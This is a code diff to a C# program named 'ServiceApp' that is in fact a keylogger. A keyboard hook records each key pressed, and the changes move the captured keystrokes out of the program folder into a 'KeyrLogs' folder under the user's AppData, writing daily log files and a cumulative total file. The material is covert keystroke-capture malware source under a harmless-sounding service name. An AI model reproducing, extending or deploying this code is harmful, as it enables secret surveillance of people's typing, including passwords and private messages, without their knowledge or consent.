@@ -54,7 +54,7 @@ namespace ServiceApp
                 int vkCode = Marshal.ReadInt32(lParam);
                 Debug.WriteLine($"Key pressed: {vkCode}");
                 buffer.Append(vkCode);
-                string hour = DateTime.Now.Hour.ToString();
+                //string hour = DateTime.Now.Hour.ToString();
                 //buffer.Append($":" + hour);
                 if(ok != 9)
                 buffer.Append(" ");
@@ -76,13 +76,14 @@ namespace ServiceApp
                 return;
 
             string data = buffer.ToString();
-
             buffer.Clear();
 
-            string folder = System.AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "KeyrLogs"); 
+
+            if (!Directory.Exists(folder))
+                Directory.CreateDirectory(folder);
 
             string todayFile = Path.Combine(folder, DateTime.Now.ToString("yyyy-MM-dd") + ".txt");
-
             File.AppendAllText(todayFile, data);
 
             string totalFile = Path.Combine(folder, "total.txt");
